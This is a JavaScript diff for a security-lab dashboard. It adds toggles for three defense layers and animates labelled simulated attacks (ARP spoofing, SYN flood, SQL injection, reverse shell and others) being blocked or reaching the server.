@@ -9,7 +9,14 @@
 const state = {
   logs: [],
   maxLogs: 300,
+  defenseL1Active: false,
+  defenseL2Active: false,
   defenseL3Active: null,
+  defenseL3Subflags: {
+    anti_sqli: false,
+    rate_limit: false,
+    input_sanitization: false,
+  },
   attackEvents: [],
   autoScroll: true,
   filterTag: 'ALL',
@@ -133,7 +140,7 @@ function initSocket() {
       renderTable();
       updateBufferCount();
     }
-    updateDefenseUI(data.defense_l3_state);
+    updateDefenseUI(data.defense_l3_state, data.defense_layers, data.current_state);
     state.attackEvents = data.attack_events || [];
     renderAttackEvents();
     for (const [node, ip] of Object.entries(data.nodes || {})) {
@@ -153,7 +160,7 @@ function initSocket() {
 
   // Nhận bản tin Telemetry thời gian thực từ Target App
   state.socket.on('GOD_VIEW_UPDATE', (payload) => {
-    const { log, metrics, network_state, os_l7_state, defense_l3_state } = payload;
+    const { log, metrics, network_state, os_l7_state, defense_l3_state, defense_layers } = payload;
     if (network_state) {
       updateNetworkStateUI(network_state, metrics);
     }
@@ -163,7 +170,7 @@ function initSocket() {
     handleIncomingTelemetry(log);
 
     if (metrics) updateMetricsUI(metrics);
-    updateDefenseUI(defense_l3_state);
+    updateDefenseUI(defense_l3_state, defense_layers);
   });
 
   // Nhận cập nhật trạng thái mạng L2/L4 trực tiếp (ARP, MitM, SYN, RST)
@@ -178,9 +185,9 @@ function initSocket() {
     if (payload.os_l7_state) updateOsL7StateUI(payload.os_l7_state);
   });
 
-  // Nhận sự kiện đồng bộ khi khiên phòng thủ thay đổi
+  // Nhận sự kiện đồng bộ khi khiên phòng thủ thay đổi (W5-T1: L1, L2, L3)
   state.socket.on('DEFENSE_TOGGLED', (payload) => {
-    updateDefenseUI(payload.defense_l3_state);
+    updateDefenseUI(payload.defense_l3_state, payload.defense_layers, payload.current_state);
   });
 
   state.socket.on('ATTACK_EVENT', (event) => {
@@ -268,44 +275,184 @@ function triggerWarningBanner(log) {
 }
 
 // ==========================================
-// 3. DEFENSE SHIELD & SYSTEM METRICS
+// 3. W5-T1: 3-LAYER DEFENSE SHIELD & SYSTEM METRICS
 // ==========================================
-function updateDefenseUI(isActive) {
-  state.defenseL3Active = isActive;
+function updateDefenseUI(isL3Active, defenseLayers, currentState) {
+  if (defenseLayers && typeof defenseLayers === 'object') {
+    if (typeof defenseLayers.l1_network === 'boolean') state.defenseL1Active = defenseLayers.l1_network;
+    if (typeof defenseLayers.l2_os === 'boolean') state.defenseL2Active = defenseLayers.l2_os;
+    if (defenseLayers.l3_app !== undefined) state.defenseL3Active = defenseLayers.l3_app;
+    if (defenseLayers.l3_subflags && typeof defenseLayers.l3_subflags === 'object') {
+      state.defenseL3Subflags = { ...state.defenseL3Subflags, ...defenseLayers.l3_subflags };
+    }
+  }
+  if (isL3Active !== undefined) {
+    state.defenseL3Active = isL3Active;
+  }
+  if (currentState && typeof currentState === 'object') {
+    state.defenseL3Subflags = {
+      anti_sqli: Boolean(currentState.anti_sqli),
+      rate_limit: Boolean(currentState.rate_limit),
+      input_sanitization: Boolean(currentState.input_sanitization),
+    };
+  } else if (typeof state.defenseL3Active === 'boolean' && (!defenseLayers || !defenseLayers.l3_subflags)) {
+    state.defenseL3Subflags = {
+      anti_sqli: state.defenseL3Active,
+      rate_limit: state.defenseL3Active,
+      input_sanitization: state.defenseL3Active,
+    };
+  }
 
-  const pill = document.getElementById('defense-state-pill');
+  // 1. Update Layer 1 (Network Shield) UI
+  const l1Pill = document.getElementById('defense-l1-pill');
+  const l1Btn = document.getElementById('btn-toggle-defense-l1');
+  const l1BtnText = document.getElementById('defense-l1-btn-text');
+  const l1Row = document.getElementById('shield-row-l1');
+  const l1Aura = document.getElementById('shield-aura-l1');
+  const l1Badge = document.getElementById('shield-l1-badge');
+
+  if (state.defenseL1Active) {
+    if (l1Pill) { l1Pill.textContent = 'ACTIVE'; l1Pill.className = 'pill-active'; }
+    if (l1Btn) l1Btn.classList.add('active');
+    if (l1BtnText) l1BtnText.textContent = 'DISABLE L1';
+    if (l1Row) l1Row.classList.add('layer-active');
+    if (l1Aura) l1Aura.classList.remove('inactive');
+    if (l1Badge) { l1Badge.textContent = 'L1 NET: ON'; l1Badge.className = 'badge badge-shield'; }
+  } else {
+    if (l1Pill) { l1Pill.textContent = 'BYPASSED'; l1Pill.className = 'pill-inactive'; }
+    if (l1Btn) l1Btn.classList.remove('active');
+    if (l1BtnText) l1BtnText.textContent = 'ENABLE L1';
+    if (l1Row) l1Row.classList.remove('layer-active');
+    if (l1Aura) l1Aura.classList.add('inactive');
+    if (l1Badge) { l1Badge.textContent = 'L1 NET: OFF'; l1Badge.className = 'badge badge-shield inactive'; }
+  }
+
+  // 2. Update Layer 2 (OS & Kernel Shield) UI
+  const l2Pill = document.getElementById('defense-l2-pill');
+  const l2Btn = document.getElementById('btn-toggle-defense-l2');
+  const l2BtnText = document.getElementById('defense-l2-btn-text');
+  const l2Row = document.getElementById('shield-row-l2');
+  const l2Aura = document.getElementById('shield-aura-l2');
+  const l2Badge = document.getElementById('shield-l2-badge');
+
+  if (state.defenseL2Active) {
+    if (l2Pill) { l2Pill.textContent = 'ACTIVE'; l2Pill.className = 'pill-active'; }
+    if (l2Btn) l2Btn.classList.add('active');
+    if (l2BtnText) l2BtnText.textContent = 'DISABLE L2';
+    if (l2Row) l2Row.classList.add('layer-active');
+    if (l2Aura) l2Aura.classList.remove('inactive');
+    if (l2Badge) { l2Badge.textContent = 'L2 OS: ON'; l2Badge.className = 'badge badge-shield'; }
+  } else {
+    if (l2Pill) { l2Pill.textContent = 'BYPASSED'; l2Pill.className = 'pill-inactive'; }
+    if (l2Btn) l2Btn.classList.remove('active');
+    if (l2BtnText) l2BtnText.textContent = 'ENABLE L2';
+    if (l2Row) l2Row.classList.remove('layer-active');
+    if (l2Aura) l2Aura.classList.add('inactive');
+    if (l2Badge) { l2Badge.textContent = 'L2 OS: OFF'; l2Badge.className = 'badge badge-shield inactive'; }
+  }
+
+  // 3. Update Layer 3 (Application Shield L7) UI
+  const l3Pill = document.getElementById('defense-l3-pill');
   const btn = document.getElementById('btn-toggle-defense');
+  const l3Row = document.getElementById('shield-row-l3');
   const shieldAura = document.getElementById('shield-aura');
   const shieldBadge = document.getElementById('shield-badge-indicator');
   const btnText = document.getElementById('defense-btn-text');
 
-  if (typeof isActive !== 'boolean') {
-    pill.textContent = 'UNKNOWN';
-    pill.className = 'pill-inactive';
-    btn.className = 'cyber-btn btn-defense-toggle';
-    btnText.textContent = 'CHECK TARGET STATE';
-    shieldAura.classList.add('inactive');
-    shieldBadge.textContent = 'SHIELD: UNKNOWN';
-    shieldBadge.className = 'badge badge-shield inactive';
-    return;
-  }
-  document.getElementById('defense-error').textContent = '';
-  if (isActive) {
-    pill.textContent = 'ACTIVE';
-    pill.className = 'pill-active';
-    btn.className = 'cyber-btn btn-defense-toggle active';
-    btnText.textContent = 'DISABLE L3 DEFENSE';
-    shieldAura.classList.remove('inactive');
-    shieldBadge.textContent = 'SHIELD: ACTIVE';
-    shieldBadge.className = 'badge badge-shield';
+  const l3AnySubActive = Boolean(
+    state.defenseL3Active ||
+      (typeof state.defenseL3Active === 'boolean' &&
+        (state.defenseL3Subflags.anti_sqli ||
+          state.defenseL3Subflags.rate_limit ||
+          state.defenseL3Subflags.input_sanitization)),
+  );
+
+  if (typeof state.defenseL3Active !== 'boolean') {
+    if (l3Pill) { l3Pill.textContent = 'UNKNOWN'; l3Pill.className = 'pill-inactive'; }
+    if (btn) btn.classList.remove('active');
+    if (btnText) btnText.textContent = 'CHECK L3';
+    if (l3Row) l3Row.classList.remove('layer-active');
+    if (shieldAura) shieldAura.classList.add('inactive');
+    if (shieldBadge) {
+      shieldBadge.textContent = 'L3 APP: UNKNOWN';
+      shieldBadge.className = 'badge badge-shield inactive';
+    }
   } else {
-    pill.textContent = 'BYPASSED';
-    pill.className = 'pill-inactive';
-    btn.className = 'cyber-btn btn-defense-toggle';
-    btnText.textContent = 'ENABLE L3 DEFENSE';
-    shieldAura.classList.add('inactive');
-    shieldBadge.textContent = 'SHIELD: BYPASSED';
-    shieldBadge.className = 'badge badge-shield inactive';
+    document.getElementById('defense-error').textContent = '';
+    if (state.defenseL3Active) {
+      if (l3Pill) { l3Pill.textContent = 'ACTIVE'; l3Pill.className = 'pill-active'; }
+      if (btn) btn.classList.add('active');
+      if (btnText) btnText.textContent = 'DISABLE L3';
+      if (l3Row) l3Row.classList.add('layer-active');
+      if (shieldAura) shieldAura.classList.remove('inactive');
+      if (shieldBadge) {
+        shieldBadge.textContent = 'L3 APP: ON';
+        shieldBadge.className = 'badge badge-shield';
+      }
+    } else if (l3AnySubActive) {
+      if (l3Pill) { l3Pill.textContent = 'PARTIAL'; l3Pill.className = 'pill-active'; }
+      if (btn) btn.classList.add('active');
+      if (btnText) btnText.textContent = 'ENABLE ALL L3';
+      if (l3Row) l3Row.classList.add('layer-active');
+      if (shieldAura) shieldAura.classList.remove('inactive');
+      if (shieldBadge) {
+        shieldBadge.textContent = 'L3 APP: PARTIAL';
+        shieldBadge.className = 'badge badge-shield';
+      }
+    } else {
+      if (l3Pill) { l3Pill.textContent = 'BYPASSED'; l3Pill.className = 'pill-inactive'; }
+      if (btn) btn.classList.remove('active');
+      if (btnText) btnText.textContent = 'ENABLE L3';
+      if (l3Row) l3Row.classList.remove('layer-active');
+      if (shieldAura) shieldAura.classList.add('inactive');
+      if (shieldBadge) {
+        shieldBadge.textContent = 'L3 APP: OFF';
+        shieldBadge.className = 'badge badge-shield inactive';
+      }
+    }
+  }
+
+  // 4. Update L3 Sub-flag chips
+  const sqliChip = document.getElementById('btn-subflag-sqli');
+  const sqliVal = document.getElementById('subflag-sqli-val');
+  const rlChip = document.getElementById('btn-subflag-ratelimit');
+  const rlVal = document.getElementById('subflag-ratelimit-val');
+  const sanChip = document.getElementById('btn-subflag-sanitize');
+  const sanVal = document.getElementById('subflag-sanitize-val');
+
+  const sqliOn = typeof state.defenseL3Active === 'boolean' && (state.defenseL3Active || state.defenseL3Subflags.anti_sqli);
+  const rlOn = typeof state.defenseL3Active === 'boolean' && (state.defenseL3Active || state.defenseL3Subflags.rate_limit);
+  const sanOn = typeof state.defenseL3Active === 'boolean' && (state.defenseL3Active || state.defenseL3Subflags.input_sanitization);
+
+  if (sqliChip) sqliChip.classList.toggle('subflag-on', sqliOn);
+  if (sqliVal) sqliVal.textContent = sqliOn ? 'ON' : 'OFF';
+  if (rlChip) rlChip.classList.toggle('subflag-on', rlOn);
+  if (rlVal) rlVal.textContent = rlOn ? 'ON' : 'OFF';
+  if (sanChip) sanChip.classList.toggle('subflag-on', sanOn);
+  if (sanVal) sanVal.textContent = sanOn ? 'ON' : 'OFF';
+
+  // 5. Update Master Funnel Summary Pill & Badge
+  const activeCount =
+    (state.defenseL1Active ? 1 : 0) +
+    (state.defenseL2Active ? 1 : 0) +
+    (l3AnySubActive ? 1 : 0);
+  const masterPill = document.getElementById('defense-state-pill');
+  const funnelBadge = document.getElementById('funnel-active-count');
+  if (funnelBadge) {
+    funnelBadge.textContent = `${activeCount} / 3 SHIELDS`;
+    funnelBadge.className = activeCount > 0 ? 'badge badge-shield' : 'badge badge-shield inactive';
+  }
+  if (masterPill) {
+    if (activeCount === 3) {
+      masterPill.textContent = 'FULL 3-LAYER';
+      masterPill.className = 'pill-active';
+    } else if (activeCount > 0) {
+      masterPill.textContent = `${activeCount}/3 ACTIVE`;
+      masterPill.className = 'pill-active';
+    } else {
+      masterPill.textContent = typeof state.defenseL3Active === 'boolean' ? 'BYPASSED' : 'UNKNOWN';
+      masterPill.className = 'pill-inactive';
+    }
   }
 }
 
@@ -755,12 +902,167 @@ function renderL7AlertsTable(alerts, counters) {
 }
 
 // ==========================================
-// 4. CANVAS TOPOLOGY PARTICLE ENGINE
+// 4. CANVAS TOPOLOGY PARTICLE ENGINE & W5-T1 3-LAYER SHIELD COLLISION
 // ==========================================
 let canvas, ctx;
 let particles = [];
 let shieldImpactSparks = [];
 let floatingLabels = [];
+
+// Bán kính va chạm của 3 Lớp Khiên Chắn đồng tâm quanh Target Server (Task W5-T1)
+const SHIELD_RADII = {
+  L1_NETWORK: 152, // Vòng ngoài cùng (Cyan): Static ARP + iptables SYN/RST Filter
+  L2_OS: 126,      // Vòng giữa (Amber/Yellow): tcp_syncookies=1 + ulimit/cgroups + nologin
+  L3_APP: 98,      // Vòng trong cùng (Green): Prepared SQL + Token Bucket + Input Sanitizer
+};
+
+/**
+ * Xác định lớp khiên nào sẽ chặn đòn tấn công này (Phễu Phòng thủ 3 Lớp - Task W5-T1)
+ * Trả về null nếu không có lớp khiên tương ứng nào đang bật (gói tin lọt qua phễu và đánh trúng đích!)
+ */
+function resolveBlockingShieldLayer(tag) {
+  // 1. Tấn công Mạng L2/L4: ARP Spoofing & TCP RST Injection -> Chặn tại Khiên Mạng L1
+  if (tag === 'ARP_SPOOF') {
+    if (state.defenseL1Active) {
+      return {
+        layer: 'L1',
+        radius: SHIELD_RADII.L1_NETWORK,
+        color: '#00f0ff',
+        label: '🛡️ BLOCKED [L1: STATIC ARP]',
+      };
+    }
+    return null;
+  }
+
+  if (tag === 'RST_INJECTION') {
+    if (state.defenseL1Active) {
+      return {
+        layer: 'L1',
+        radius: SHIELD_RADII.L1_NETWORK,
+        color: '#00f0ff',
+        label: '🛡️ DROPPED [L1: IPTABLES RST FILTER]',
+      };
+    }
+    return null;
+  }
+
+  // 2. TCP SYN Flood (L4): Chặn ở Vòng ngoài L1 (iptables limit) HOẶC Vòng giữa L2 (Kernel tcp_syncookies=1)
+  if (tag === 'SYN_FLOOD') {
+    if (state.defenseL1Active) {
+      return {
+        layer: 'L1',
+        radius: SHIELD_RADII.L1_NETWORK,
+        color: '#00f0ff',
+        label: '🛡️ DROPPED [L1: IPTABLES SYN LIMIT]',
+      };
+    }
+    if (state.defenseL2Active) {
+      return {
+        layer: 'L2',
+        radius: SHIELD_RADII.L2_OS,
+        color: '#ffd700',
+        label: '🛡️ MITIGATED [L2: TCP_SYNCOOKIES=1]',
+      };
+    }
+    return null;
+  }
+
+  // 3. Tấn công Tài nguyên Hệ điều hành: FD Exhaustion (lsof) & Fork Bomb -> Chặn tại Vòng giữa L2 (ulimit / cgroups)
+  if (tag === 'FD_EXHAUSTION' || tag === 'FORK_BOMB') {
+    if (state.defenseL2Active) {
+      return {
+        layer: 'L2',
+        radius: SHIELD_RADII.L2_OS,
+        color: '#ffd700',
+        label: '🛡️ CONTAINED [L2: ULIMIT / CGROUPS]',
+      };
+    }
+    return null;
+  }
+
+  // 4. OS Command Injection & Reverse Shell:
+  // - Nếu L3 (Input Sanitization) BẬT -> Chặn ở Vòng trong cùng L3 (98px)
+  // - Nếu L3 TẮT nhưng L2 (OS nologin/cgroups) BẬT -> Chặn khi cố mở tiến trình shell tại Vòng giữa L2 (126px)
+  if (tag === 'COMMAND_INJECTION' || tag === 'REVERSE_SHELL') {
+    const l3SanitizerOn = Boolean(
+      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
+    );
+    if (l3SanitizerOn && tag !== 'REVERSE_SHELL') {
+      return {
+        layer: 'L3',
+        radius: SHIELD_RADII.L3_APP,
+        color: '#00ff66',
+        label: '🛡️ BLOCKED [L3: INPUT SANITIZER]',
+      };
+    }
+    if (state.defenseL2Active) {
+      return {
+        layer: 'L2',
+        radius: SHIELD_RADII.L2_OS,
+        color: '#ffd700',
+        label: '🛡️ SHELL KILLED [L2: NOLOGIN / CGROUPS]',
+      };
+    }
+    return null;
+  }
+
+  // 5. Tấn công Tầng Ứng dụng L7 (Lọt qua L1 & L2 vì là gói TCP/HTTP hợp lệ -> Chỉ bị chặn bởi Vòng trong cùng L3)
+  if (tag === 'SQL_INJECTION') {
+    const l3SqliOn = Boolean(
+      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.anti_sqli),
+    );
+    if (l3SqliOn) {
+      return {
+        layer: 'L3',
+        radius: SHIELD_RADII.L3_APP,
+        color: '#00ff66',
+        label: '🛡️ BLOCKED [L3: PREPARED STATEMENTS]',
+      };
+    }
+    return null;
+  }
+
+  if (tag === 'BRUTE_FORCE' || tag === 'HEAVY_DOS') {
+    const l3RateLimitOn = Boolean(
+      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.rate_limit),
+    );
+    if (l3RateLimitOn) {
+      return {
+        layer: 'L3',
+        radius: SHIELD_RADII.L3_APP,
+        color: '#00ff66',
+        label: '🛡️ 429 BLOCKED [L3: TOKEN BUCKET]',
+      };
+    }
+    return null;
+  }
+
+  if (tag === 'PATH_TRAVERSAL') {
+    const l3SanitizerOn = Boolean(
+      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
+    );
+    if (l3SanitizerOn) {
+      return {
+        layer: 'L3',
+        radius: SHIELD_RADII.L3_APP,
+        color: '#00ff66',
+        label: '🛡️ BLOCKED [L3: PATH SANITIZER]',
+      };
+    }
+    return null;
+  }
+
+  // Mặc định cho các đòn tấn công khác
+  if (state.defenseL3Active) {
+    return {
+      layer: 'L3',
+      radius: SHIELD_RADII.L3_APP,
+      color: '#00ff66',
+      label: '🛡️ BLOCKED [L3: APP SHIELD]',
+    };
+  }
+  return null;
+}
 
 function initCanvas() {
   canvas = document.getElementById('topology-canvas');
@@ -839,40 +1141,64 @@ function spawnPacketParticles(log) {
     floatingLabels.push({
       x: hackerPos.x - 75,
       y: hackerPos.y - 25,
-      text: '⚠️ ARP REPLY: SPOOFED MAC!',
+      text: state.defenseL1Active ? '🛡️ ARP SPOOF -> BLOCKED BY L1 STATIC ARP!' : '⚠️ ARP REPLY: SPOOFED MAC!',
       alpha: 1,
-      color: '#ffd700',
+      color: state.defenseL1Active ? '#00f0ff' : '#ffd700',
     });
-    // Đồng thời bắn 1 luồng gói tin Client bị bẻ góc đi vòng qua Hacker -> Server
-    spawnMitmBentParticles(clientPos, hackerPos, serverPos);
+    // Nếu Khiên Mạng L1 tắt -> luồng gói tin Client bị bẻ góc đi vòng qua Hacker -> Server
+    // Nếu Khiên Mạng L1 bật -> Static ARP bảo vệ luồng Client -> Server đi thẳng xanh lá bình thường!
+    if (!state.defenseL1Active) {
+      spawnMitmBentParticles(clientPos, hackerPos, serverPos);
+    } else {
+      for (let i = 0; i < 4; i++) {
+        particles.push({
+          x: clientPos.x,
+          y: clientPos.y + (Math.random() * 14 - 7),
+          targetX: serverPos.x,
+          targetY: serverPos.y + (Math.random() * 14 - 7),
+          startX: clientPos.x,
+          startY: clientPos.y,
+          progress: 0,
+          speed: 0.014 + Math.random() * 0.008,
+          type: 'NORMAL',
+          color: '#00ff66',
+          size: 2.8,
+          tag: 'NORMAL',
+          spread: (Math.random() - 0.5) * 20,
+        });
+      }
+    }
     return;
   }
 
   if (log.attack_tag === 'RST_INJECTION') {
-    // Hacker bắn gói tin TCP RST sắc nhọn ngắt kết nối giữa Client và Server
-    const rstBadge = document.getElementById('rst-badge-indicator');
-    const clientStatus = document.getElementById('client-status');
-    rstBadge.classList.remove('hidden');
-    clientStatus.textContent = '⚡ CONN RESET (RST)';
-    clientNode.classList.add('compromised');
-    if (state.rstBannerTimer) clearTimeout(state.rstBannerTimer);
-    state.rstBannerTimer = setTimeout(() => {
-      rstBadge.classList.add('hidden');
-      clientStatus.textContent = 'IDLE';
-      clientNode.classList.remove('compromised');
-    }, 4000);
+    // Nếu Khiên Mạng L1 tắt -> gói TCP RST đánh sập phiên Client-Server
+    if (!state.defenseL1Active) {
+      const rstBadge = document.getElementById('rst-badge-indicator');
+      const clientStatus = document.getElementById('client-status');
+      rstBadge.classList.remove('hidden');
+      clientStatus.textContent = '⚡ CONN RESET (RST)';
+      clientNode.classList.add('compromised');
+      if (state.rstBannerTimer) clearTimeout(state.rstBannerTimer);
+      state.rstBannerTimer = setTimeout(() => {
+        rstBadge.classList.add('hidden');
+        clientStatus.textContent = 'IDLE';
+        clientNode.classList.remove('compromised');
+      }, 4000);
 
-    // Hủy các hạt xanh đang bay trên đường truyền Client <-> Server (hiệu ứng đứt phiên)
-    for (let i = particles.length - 1; i >= 0; i--) {
-      if (particles[i].type === 'NORMAL') {
-        spawnShieldDeflection(particles[i].x, particles[i].y, '#ff003c', '⚡ TCP RST! SESSION DROPPED');
-        particles.splice(i, 1);
+      // Hủy các hạt xanh đang bay trên đường truyền Client <-> Server (hiệu ứng đứt phiên)
+      for (let i = particles.length - 1; i >= 0; i--) {
+        if (particles[i].type === 'NORMAL') {
+          spawnShieldDeflection(particles[i].x, particles[i].y, '#ff003c', '⚡ TCP RST! SESSION DROPPED');
+          particles.splice(i, 1);
+        }
       }
     }
 
     const midX = (clientPos.x + serverPos.x) / 2;
     const midY = (clientPos.y + serverPos.y) / 2;
-    for (const dst of [clientPos, serverPos, { x: midX, y: midY }]) {
+    const rstTargets = state.defenseL1Active ? [serverPos, clientPos] : [clientPos, serverPos, { x: midX, y: midY }];
+    for (const dst of rstTargets) {
       for (let i = 0; i < 5; i++) {
         particles.push({
           x: hackerPos.x,
@@ -894,15 +1220,19 @@ function spawnPacketParticles(log) {
     floatingLabels.push({
       x: midX - 65,
       y: midY,
-      text: '⚡ TCP RST [CONN RESET]',
+      text: state.defenseL1Active ? '🛡️ L1 IPTABLES: FORGED RST DROPPED' : '⚡ TCP RST [CONN RESET]',
       alpha: 1,
-      color: '#ff003c',
+      color: state.defenseL1Active ? '#00f0ff' : '#ff003c',
     });
     return;
   }
 
   if (log.attack_tag === 'COMMAND_INJECTION' || log.attack_tag === 'REVERSE_SHELL') {
-    const isBlocked = Boolean(state.defenseL3Active && log.status_code >= 400);
+    const l3SanitizerOn = Boolean(
+      state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
+    );
+    const isBlockedByL3 = Boolean(l3SanitizerOn && log.status_code >= 400 && log.attack_tag !== 'REVERSE_SHELL');
+    const isBlockedByL2 = Boolean(state.defenseL2Active);
     // 1. Hacker gửi payload Command Injection lên Server
     for (let i = 0; i < 8; i++) {
       particles.push({
@@ -921,8 +1251,8 @@ function spawnPacketParticles(log) {
         spread: (Math.random() - 0.5) * 28,
       });
     }
-    // 2. Nếu không bị Khiên L3 chặn -> Server mở kết nối Reverse Shell NGƯỢC về Hacker (Server -> Hacker)
-    if (!isBlocked) {
+    // 2. Nếu cả Khiên L3 và Khiên HĐH L2 đều TẮT -> Server mở kết nối Reverse Shell NGƯỢC về Hacker (Server -> Hacker)
+    if (!isBlockedByL3 && !isBlockedByL2) {
       spawnReverseShellOutboundParticles(serverPos, hackerPos, 14);
       floatingLabels.push({
         x: (serverPos.x + hackerPos.x) / 2 - 55,
@@ -1212,6 +1542,27 @@ function updateAndDrawParticles() {
     const p = particles[i];
     p.progress += p.speed;
 
+    if (p.recoil) {
+      // Hạt độc hại bị Khiên Chắn đánh bật và dội ngược (Bounce-Back) về phía Hacker!
+      const t = Math.min(1, p.progress);
+      p.x = p.startX + (p.targetX - p.startX) * t;
+      p.y = p.startY + (p.targetY - p.startY) * t - Math.sin(t * Math.PI) * 18;
+      if (p.progress >= 1) {
+        particles.splice(i, 1);
+        continue;
+      }
+      ctx.save();
+      ctx.globalAlpha = Math.max(0.15, 1 - t * 0.85);
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+      ctx.fillStyle = p.color;
+      ctx.shadowColor = p.color;
+      ctx.shadowBlur = 10;
+      ctx.fill();
+      ctx.restore();
+      continue;
+    }
+
     if (p.mitmRelay) {
       // Chuyển động thẳng sắc nét trên đường truyền bẻ góc Client -> Hacker -> Server
       const t = Math.min(1, p.progress);
@@ -1227,15 +1578,20 @@ function updateAndDrawParticles() {
       p.y = (1 - t) * (1 - t) * p.startY + 2 * (1 - t) * t * cpY + t * t * p.targetY;
     }
 
-    // KIỂM TRA VA CHẠM KHIÊN CHẮN (SHIELD BARRIER INTERACTION)
-    const shieldDistanceThreshold = 115;
-    const distToServer = Math.hypot(p.targetX - p.x, p.targetY - p.y);
-
-    if (p.type === 'ATTACK' && state.defenseL3Active && distToServer <= shieldDistanceThreshold) {
-      // Hạt tấn công va vào khiên chắn -> VA CHẠM & BỊ DỘI NGƯỢC (DROP)
-      spawnShieldDeflection(p.x, p.y);
-      particles.splice(i, 1);
-      continue;
+    // W5-T1: KIỂM TRA VA CHẠM TẠI ĐÚNG LỚP KHIÊN CHẮN TƯƠNG ỨNG (L1 OUTER 152px / L2 MIDDLE 126px / L3 INNER 98px)
+    const isMaliciousParticle = p.type === 'ATTACK' || p.type === 'ARP_SPOOF' || p.type === 'RST_INJECTION';
+    if (isMaliciousParticle) {
+      const shieldMatch = resolveBlockingShieldLayer(p.tag);
+      const distToTarget = Math.hypot(p.targetX - p.x, p.targetY - p.y);
+      if (shieldMatch && distToTarget <= shieldMatch.radius) {
+        // Gói tin độc hại bị chặn đứng và dội ngược lại tại đúng lớp khiên tương ứng!
+        spawnShieldDeflection(p.x, p.y, shieldMatch.color, shieldMatch.label, {
+          x: p.startX,
+          y: p.startY,
+        });
+        particles.splice(i, 1);
+        continue;
+      }
     }
 
     // Đã chạm đích của chặng hiện tại
@@ -1261,8 +1617,8 @@ function updateAndDrawParticles() {
         continue;
       }
 
-      if (p.type === 'ATTACK' && !state.defenseL3Active) {
-        // Tấn công trúng đích khi khiên TẮT -> Rung đỏ máy chủ
+      if (isMaliciousParticle && !resolveBlockingShieldLayer(p.tag)) {
+        // Tấn công lọt qua các lớp khiên đang tắt -> Rung đỏ máy chủ
         triggerServerCompromisedVisual();
       }
       particles.splice(i, 1);
@@ -1281,8 +1637,8 @@ function updateAndDrawParticles() {
   }
 }
 
-function spawnShieldDeflection(x, y, customColor = '#00f0ff', customText = '🛡️ BLOCKED [L3]') {
-  // Tạo tia lửa dội ngược
+function spawnShieldDeflection(x, y, customColor = '#00f0ff', customText = '🛡️ BLOCKED [L3]', bounceBackTarget = null) {
+  // 1. Tạo tia lửa va chạm tại mặt khiên
   for (let i = 0; i < 8; i++) {
     shieldImpactSparks.push({
       x,
@@ -1295,10 +1651,32 @@ function spawnShieldDeflection(x, y, customColor = '#00f0ff', customText = '🛡
     });
   }
 
-  // Thêm nhãn chữ nổi
-  if (Math.random() > 0.35) {
+  // 2. W5-T1: Hiệu ứng hạt độc hại bị DỘI NGƯỢC (Bounce-Back Recoil) bay trả về phía Hacker
+  if (bounceBackTarget && Math.random() > 0.25) {
+    const bounceX = x + (bounceBackTarget.x - x) * (0.45 + Math.random() * 0.35) + (Math.random() - 0.5) * 40;
+    const bounceY = y + (bounceBackTarget.y - y) * (0.45 + Math.random() * 0.35) + (Math.random() - 0.5) * 30;
+    particles.push({
+      x,
+      y,
+      startX: x,
+      startY: y,
+      targetX: bounceX,
+      targetY: bounceY,
+      progress: 0,
+      speed: 0.032 + Math.random() * 0.018,
+      type: 'RECOIL',
+      recoil: true,
+      color: customColor,
+      size: 2.6,
+      tag: 'DEFLECTED',
+      spread: 0,
+    });
+  }
+
+  // 3. Thêm nhãn chữ nổi chỉ rõ Lớp Khiên nào vừa chặn đòn (L1 / L2 / L3)
+  if (Math.random() > 0.32) {
     floatingLabels.push({
-      x: x - 35,
+      x: x - 55,
       y: y - 10,
       text: customText,
       alpha: 1,
@@ -1486,10 +1864,21 @@ function matchFilter(log) {
 // 6. EVENT LISTENERS & USER ACTIONS
 // ==========================================
 function initEventListeners() {
-  // Nút Toggle Defense
+  // W5-T1: Nút Toggle 3 Lớp Khiên Chắn (L1 Network, L2 OS, L3 App & L7 Sub-flags)
+  const l1Btn = document.getElementById('btn-toggle-defense-l1');
+  if (l1Btn) l1Btn.addEventListener('click', () => toggleDefenseLayer('l1'));
+  const l2Btn = document.getElementById('btn-toggle-defense-l2');
+  if (l2Btn) l2Btn.addEventListener('click', () => toggleDefenseLayer('l2'));
   document.getElementById('btn-toggle-defense').addEventListener('click', () => {
     toggleDefense();
   });
+
+  const sqliChip = document.getElementById('btn-subflag-sqli');
+  if (sqliChip) sqliChip.addEventListener('click', () => toggleDefenseSubFlag('anti_sqli'));
+  const rlChip = document.getElementById('btn-subflag-ratelimit');
+  if (rlChip) rlChip.addEventListener('click', () => toggleDefenseSubFlag('rate_limit'));
+  const sanChip = document.getElementById('btn-subflag-sanitize');
+  if (sanChip) sanChip.addEventListener('click', () => toggleDefenseSubFlag('input_sanitization'));
 
   // Nút Reset State
   document.getElementById('btn-reset-state').addEventListener('click', () => {
@@ -1607,6 +1996,44 @@ async function restoreCleanArp() {
   }
 }
 
+async function toggleDefenseLayer(layer) {
+  const btnId = layer === 'l1' ? 'btn-toggle-defense-l1' : 'btn-toggle-defense-l2';
+  const button = document.getElementById(btnId);
+  if (button) button.disabled = true;
+  try {
+    const currentVal = layer === 'l1' ? state.defenseL1Active : state.defenseL2Active;
+    const res = await fetch('/api/defense/toggle', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ layer, enabled: !currentVal }),
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.message || `Không thể đổi trạng thái khiên ${layer.toUpperCase()}.`);
+    updateDefenseUI(data.defense_l3_app, data.defense_layers, data.current_state);
+  } catch (error) {
+    document.getElementById('defense-error').textContent = error.message;
+  } finally {
+    if (button) button.disabled = false;
+  }
+}
+
+async function toggleDefenseSubFlag(flag) {
+  try {
+    const res = await fetch('/api/defense/toggle', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ layer: 'l3', flag }),
+    });
+    const data = await res.json();
+    if (!res.ok || typeof data.defense_l3_app !== 'boolean') {
